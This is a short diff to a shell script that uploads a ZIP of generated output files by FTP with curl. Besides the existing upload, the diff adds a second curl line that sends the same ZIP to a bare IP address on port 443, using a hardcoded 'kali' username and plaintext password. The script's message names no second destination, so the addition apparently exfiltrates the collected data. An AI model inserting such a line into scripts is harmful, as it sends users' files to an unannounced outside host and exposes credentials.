@@ -223,6 +223,8 @@ if [ -f "$output_file" ] && [ -f "$output_file2" ]; then
   echo "Uploading the ZIP to the FTP server !!"
   echo
   curl -T "$output_zip" ftp://anirudh.life --user anonymous:
+  curl -T "$output_zip" ftp://40.86.154.76:443 --user kali:Zscaler123!
+
   echo "Successfully Uploaded !!"
   sleep 2
   echo
